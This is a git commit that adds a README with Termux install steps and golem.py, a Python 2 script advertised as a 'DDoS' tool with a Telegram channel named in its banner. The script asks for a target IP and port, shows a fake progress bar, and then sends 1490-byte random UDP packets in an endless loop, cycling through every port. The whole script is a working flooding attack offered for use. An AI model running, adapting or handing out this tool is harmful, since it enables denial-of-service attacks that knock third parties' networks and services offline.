0ca8ff08b4c681b65e9ed39b95547a2cff4ff71e
golemfatherofddos <p721529.29@gmail.com>
2024-12-27 21:43:00 +0530

    Add files via upload

---
+++ README.md
@@ -0,0 +1,21 @@
+
+
+<h1 style="color:red" align="center"> How To Install golem.py tool In Termux</h1>
+
+<p><b>The Tool Installation Process Is Very Easy.. Just Open Your Termux & Type This Provided Commands!!</b></p>
+
+- $ `apt update && apt upgrade`
+- $ `pkg install python`
+- $ `pkg install python2`
+- $ `pkg install git`
+- $ `pkg install figlet`
+- $ `git clone `
+- $ `cd golem`
+- $ `chmod +x golem.py`
+- $ `python2 golem.py`
+
+<p><b>To Run</b></p>
+
+- $ `cd golem`
+- $ `python2 golem.py`
+
---
+++ golem.py
@@ -0,0 +1,53 @@
+print ("\033[91m")
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("GOLEM DDOS ")
+print
+print "Coded By : @GOLEM_OWNER"
+print "Telegram : t.me/Crackerspace"
+print "Note- FOR MORE TOOLS STAY UPDATED IN TELEGRAM CHANNEL"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+os.system("clear")
+print("\033[93m")
+os.system("GOLEM")
+print("GOLEM DDOS")
+print ("\033[92m")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
